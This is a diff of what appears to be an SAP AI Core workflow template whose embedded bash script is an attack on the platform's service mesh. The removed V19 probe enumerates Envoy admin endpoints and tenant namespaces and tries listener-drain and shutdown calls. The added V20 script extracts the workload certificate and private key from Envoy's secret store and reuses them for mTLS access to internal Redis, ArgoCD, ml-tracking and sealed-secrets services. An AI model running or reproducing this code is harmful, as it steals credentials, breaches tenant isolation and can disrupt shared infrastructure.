@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "19.0.0"
+    ai.sap.com/version: "20.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,137 +24,129 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V19 DEEP PROBE ==="
+        echo "=== V20 SPIFFE CERT EXTRACTION + MTLS BYPASS ==="
         
-        # === ENVOY SIDECAR ADMIN (localhost:15000) ===
-        echo "=== ENVOY ADMIN ==="
+        # === EXTRACT CERTS FROM ENVOY SDS ===
+        echo "=== SDS SECRET DUMP ==="
         
-        echo "--- /server_info ---"
-        curl -s --connect-timeout 3 "http://localhost:15000/server_info" 2>&1 | head -c 1000
+        # Get dynamic secrets from Envoy config_dump
+        SDS=$(curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1)
+        echo "SDS_BYTES=$(echo "$SDS" | wc -c)"
+        
+        # Extract the cert and key from SDS
+        echo "$SDS" | python3 -c "
+import sys, json, base64
+try:
+    data = json.load(sys.stdin)
+    configs = data.get('configs', [])
+    for config in configs:
+        for secret in config.get('dynamic_active_secrets', config.get('secrets', [])):
+            name = secret.get('name', 'unknown')
+            print(f'SECRET: {name}')
+            tls_cert = secret.get('secret', {}).get('tls_certificate', {})
+            # Extract cert chain
+            cert_chain = tls_cert.get('certificate_chain', {})
+            if 'inline_bytes' in cert_chain:
+                cert_pem = base64.b64decode(cert_chain['inline_bytes']).decode()
+                with open('/tmp/istio-cert.pem', 'w') as f:
+                    f.write(cert_pem)
+                print(f'CERT EXTRACTED ({len(cert_pem)} bytes)')
+                print(cert_pem[:500])
+            # Extract private key
+            priv_key = tls_cert.get('private_key', {})
+            if 'inline_bytes' in priv_key:
+                key_pem = base64.b64decode(priv_key['inline_bytes']).decode()
+                with open('/tmp/istio-key.pem', 'w') as f:
+                    f.write(key_pem)
+                print(f'KEY EXTRACTED ({len(key_pem)} bytes)')
+                print('-----BEGIN EC PRIVATE KEY-----' if 'EC' in key_pem else '-----BEGIN RSA PRIVATE KEY-----')
+            # Extract CA cert (trusted_ca / validation_context)
+            val_ctx = secret.get('secret', {}).get('validation_context', {})
+            ca = val_ctx.get('trusted_ca', {})
+            if 'inline_bytes' in ca:
+                ca_pem = base64.b64decode(ca['inline_bytes']).decode()
+                with open('/tmp/istio-ca.pem', 'w') as f:
+                    f.write(ca_pem)
+                print(f'CA CERT EXTRACTED ({len(ca_pem)} bytes)')
+except Exception as e:
+    print(f'PARSE ERROR: {e}')
+    # Try raw extraction
+    pass
+" 2>&1
         echo ""
         
-        echo "--- /clusters (service mesh topology) ---"
-        CLUSTERS=$(curl -s --connect-timeout 3 "http://localhost:15000/clusters" 2>&1)
-        echo "$CLUSTERS" | head -c 3000
-        echo ""
-        echo "CLUSTER_BYTES=$(echo "$CLUSTERS" | wc -c)"
-        # Extract unique service names
-        echo "UNIQUE_SERVICES:"
-        echo "$CLUSTERS" | grep -E "^[a-z]" | head -50
+        # Also check SPIFFE UDS socket
+        echo "=== SPIFFE UDS ==="
+        ls -la ./var/run/secrets/workload-spiffe-uds/ 2>/dev/null || echo "No SPIFFE UDS at relative path"
+        ls -la /var/run/secrets/workload-spiffe-uds/ 2>/dev/null || echo "No SPIFFE UDS at absolute path"
+        find / -name "workload-spiffe*" -o -name "*.sock" 2>/dev/null | head -10
         echo ""
         
-        echo "--- /config_dump (full envoy config) ---"
-        CONFIG=$(curl -s --connect-timeout 5 "http://localhost:15000/config_dump" 2>&1)
-        echo "CONFIG_BYTES=$(echo "$CONFIG" | wc -c)"
-        # Look for secrets/certs in config
-        echo "$CONFIG" | grep -i -E "(secret|cert|key|password|token)" | head -20
-        echo ""
-        
-        echo "--- /listeners ---"
-        curl -s --connect-timeout 3 "http://localhost:15000/listeners" 2>&1 | head -c 2000
-        echo ""
-        
-        echo "--- /certs ---"
-        curl -s --connect-timeout 3 "http://localhost:15000/certs" 2>&1 | head -c 3000
-        echo ""
-        
-        echo "--- /stats (look for upstream connections) ---"
-        curl -s --connect-timeout 3 "http://localhost:15000/stats" 2>&1 | grep -E "(upstream_cx|membership)" | head -30
-        echo ""
-        
-        # === ISTIO CERTIFICATE EXTRACTION ===
-        echo "=== ISTIO CERTS ==="
-        
-        # Check for Istio cert mount paths
-        echo "--- Cert file search ---"
-        find / -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "cert-chain*" -o -name "root-cert*" 2>/dev/null | head -20
-        echo ""
-        
-        # Standard Istio cert locations
-        for certpath in           "/var/run/secrets/istio"           "/var/run/secrets/istio/root-cert.pem"           "/var/run/secrets/istio/cert-chain.pem"           "/var/run/secrets/istio/key.pem"           "/etc/certs"           "/etc/istio/proxy"           "/var/run/secrets/tokens"           "/var/run/secrets/credentials"; do
-          if [ -e "$certpath" ]; then
-            echo "FOUND: $certpath"
-            ls -la "$certpath" 2>/dev/null
-            if [ -f "$certpath" ]; then
-              head -c 500 "$certpath"
-              echo ""
-            fi
+        # Check if certs were extracted
+        if [ -f /tmp/istio-cert.pem ] && [ -f /tmp/istio-key.pem ]; then
+          echo "=== MTLS CONNECTIONS ==="
+          
+          # openssl s_client to verify cert works
+          echo "--- OpenSSL verify ---"
+          openssl x509 -in /tmp/istio-cert.pem -text -noout 2>&1 | head -20
+          echo ""
+          
+          # Try mTLS to Redis
+          echo "--- mTLS to redis.aicore (100.107.100.17:6379) ---"
+          timeout 5 openssl s_client -connect 100.107.100.17:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem             -servername outbound_.6379_._.redis.aicore.svc.cluster.local 2>&1 | head -30
+          echo ""
+          
+          # Try mTLS + Redis PING
+          echo "--- mTLS Redis PING ---"
+          echo -e "PING
+" | timeout 5 openssl s_client -connect 100.107.100.17:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem -quiet 2>&1 | head -10
+          echo ""
+          
+          # Try mTLS to user-management Redis
+          echo "--- mTLS to redis.user-management (100.109.69.212:6379) ---"
+          echo -e "PING
+INFO server
+" | timeout 5 openssl s_client -connect 100.109.69.212:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem -quiet 2>&1 | head -30
+          echo ""
+          
+          # Try mTLS to ml-tracking
+          echo "--- mTLS to ml-tracking ---"
+          curl -s --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem             "https://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
+          echo ""
+          
+          # Try mTLS to ArgoCD
+          echo "--- mTLS to ArgoCD (100.107.174.75:443) ---"
+          curl -s --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem             "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 1000
+          echo ""
+          
+          # Try mTLS to sealed-secrets
+          echo "--- Sealed secrets pod info ---"
+          # Get sealed-secrets IP from KSM
+          SS_IP=$(curl -s "http://100.106.241.163:8080/metrics" 2>&1 | grep 'kube_pod_info.*sealed-secrets' | head -1 | grep -oE 'pod_ip="[^"]+"' | cut -d'"' -f2)
+          echo "Sealed secrets pod IP: $SS_IP"
+          if [ -n "$SS_IP" ]; then
+            echo "--- mTLS to sealed-secrets ---"
+            curl -sk --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem               "https://$SS_IP:8080/v1/cert.pem" 2>&1 | head -c 500
+            echo ""
           fi
-        done
+        else
+          echo "CERT EXTRACTION FAILED - trying alternate methods"
+          
+          # Try /certs endpoint raw dump
+          echo "--- Raw certs dump ---"
+          curl -s "http://localhost:15000/certs" 2>&1 | python3 -c "
+import sys, json
+try:
+    d = json.load(sys.stdin)
+    print(json.dumps(d, indent=2)[:3000])
+except:
+    print(sys.stdin.read()[:3000])
+" 2>&1
+        fi
         
-        # Check /proc for cert data in sidecar process
-        echo "--- Process list ---"
-        ps aux 2>/dev/null | head -20
+        # === ENVOY CLUSTER DUMP (extract service IPs) ===
+        echo "=== SERVICE MAP ==="
+        curl -s "http://localhost:15000/clusters" 2>&1 | grep -E "^outbound" | grep "::hostname::" | sort -u | head -50
         echo ""
         
-        # Try to extract SDS (Secret Discovery Service) certs via Envoy
-        echo "--- Envoy SDS secrets ---"
-        curl -s --connect-timeout 3 "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1 | head -c 3000
-        echo ""
-        
-        # Try Istio debug endpoints
-        echo "--- Istio pilot-agent ---"
-        curl -s --connect-timeout 3 "http://localhost:15020/healthz/ready" 2>&1 | head -c 200
-        echo ""
-        curl -s --connect-timeout 3 "http://localhost:15020/debug/ndsz" 2>&1 | head -c 500
-        echo ""
-        curl -s --connect-timeout 3 "http://localhost:15020/debug/endpointz" 2>&1 | head -c 1000
-        echo ""
-        curl -s --connect-timeout 3 "http://localhost:15020/quitquitquit" 2>&1 | head -c 200
-        echo ""
-        
-        # === ENVOY CONFIG MODIFICATION (test if writable) ===
-        echo "=== ENVOY MODIFY TEST ==="
-        # Try to add a new route via admin API
-        echo "--- POST /logging?level=debug ---"
-        curl -s -X POST --connect-timeout 3 "http://localhost:15000/logging?level=debug" 2>&1 | head -c 500
-        echo ""
-        
-        # Try to drain listeners (DoS test - just checking if writable)
-        echo "--- POST /drain_listeners (check only) ---"
-        curl -s -X POST --connect-timeout 3 "http://localhost:15000/drain_listeners?graceful" 2>&1 | head -c 200
-        echo ""
-        
-        # === KSM DEEP ANALYSIS ===
-        echo "=== KSM DEEP ==="
-        
-        # Get full KSM pods dump and extract key data
-        KSM_DATA=$(curl -s --connect-timeout 10 "http://100.106.241.163:8080/metrics" 2>&1)
-        echo "KSM_TOTAL_BYTES=$(echo "$KSM_DATA" | wc -c)"
-        
-        # Extract unique namespaces
-        echo "NAMESPACES:"
-        echo "$KSM_DATA" | grep -oE 'namespace="[^"]+"' | sort -u
-        echo ""
-        
-        # Count pods per namespace
-        echo "PODS_PER_NS:"
-        echo "$KSM_DATA" | grep "^kube_pod_info" | grep -oE 'namespace="[^"]+"' | sort | uniq -c | sort -rn
-        echo ""
-        
-        # Look for secrets references
-        echo "SECRET_REFS:"
-        echo "$KSM_DATA" | grep -i "secret" | head -20
-        echo ""
-        
-        # Look for container images (reveal tech stack)
-        echo "CONTAINER_IMAGES:"
-        echo "$KSM_DATA" | grep -oE 'image="[^"]+"' | sort -u | head -30
-        echo ""
-        
-        # Look for resource group namespaces (other tenants)
-        echo "TENANT_NAMESPACES:"
-        echo "$KSM_DATA" | grep -oE 'namespace="rg-[^"]+"' | sort -u
-        echo ""
-        
-        # Extract host IPs (node info)
-        echo "HOST_IPS:"
-        echo "$KSM_DATA" | grep -oE 'host_ip="[^"]+"' | sort -u
-        echo ""
-        
-        # Extract priority classes (security context hints)
-        echo "PRIORITY_CLASSES:"
-        echo "$KSM_DATA" | grep -oE 'priority_class="[^"]+"' | sort -u
-        echo ""
-        
-        echo "=== V19 COMPLETE ==="
+        echo "=== V20 COMPLETE ==="
